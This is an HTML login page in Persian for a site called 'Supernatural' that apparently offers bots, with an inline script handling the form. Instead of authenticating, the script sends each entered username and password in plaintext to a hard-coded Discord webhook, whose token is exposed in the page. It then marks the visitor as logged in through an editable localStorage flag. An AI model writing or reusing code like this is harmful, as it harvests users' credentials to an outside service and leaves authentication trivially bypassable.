<!DOCTYPE html>
<html lang="fa">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ورود</title>
  <link rel="stylesheet" href="../style/login.css">
  <link rel="stylesheet" href="../style/index.css">
</head>

<body>
  <header>
    <div style="display: flex; align-items: center;">
      <img src="../assets/icon.png" alt="لوگوی SN" style="height:60px; width:auto; margin-left:10px;">
      <div class="right-texts-head-link">
        <a href="../index.html" class="sitename-link">Supernatural</a>
        <p class="sitedescription-link">سوپرنچرال کامیونیتی</a>
      </div>
    </div>
    <nav class="header-right">
      <a href="../index.html#about" class="nav-link">درباره ما</a>
      <a href="../index.html#bots" class="nav-link">ربات‌ها</a>
      <a href="../index.html#contact" class="nav-link">تماس</a>
      <a href="order.html" class="nav-link">سفارش‌های ویژه</a>
      <a href="login.html" class="btn-login">ورود</a>
      <div class="cart-icon" onclick="window.location.href='cart.html'">
        🛒 <span id="cartCount" class="cart-count">0</span>
      </div>
    </nav>
  </header>

  <div class="form-container">
    <h2>🔐 ورود</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="loginUsername">نام کاربری</label>
        <input type="text" id="loginUsername" required>
      </div>
      <div class="form-group">
        <label for="loginPassword">رمز عبور</label>
        <input type="password" id="loginPassword" required>
      </div>
      <button type="submit" class="btn">🚀 ورود</button>
    </form>
    <p class="link">
      حساب ندارید؟ <a href="register.html">ثبت نام کنید</a>
    </p>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1412388207143686214/nL7ZUkfYZ6YrDnjv42cvoTVpG1qddSAwsDQZBZcWPIzYqbkwialBozd5M1ZAmPmVrdA6";

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("loginUsername").value;
      const password = document.getElementById("loginPassword").value;

      const payload = {
        embeds: [
          {
            title: "🔐 ورود به حساب",
            color: 10181046,
            fields: [
              { name: "👤 یوزرنیم", value: username, inline: false },
              { name: "🔑 پسورد", value: password, inline: false }
            ],
            footer: { text: "Supernatural Login System" },
            timestamp: new Date()
          }
        ]
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        localStorage.setItem("isLoggedIn", "true");
        window.location.href = "index.html";
      } catch (err) {
        alert("❌ خطا در ورود، دوباره تلاش کنید.");
      }
    });
  </script>
</body>

</html>
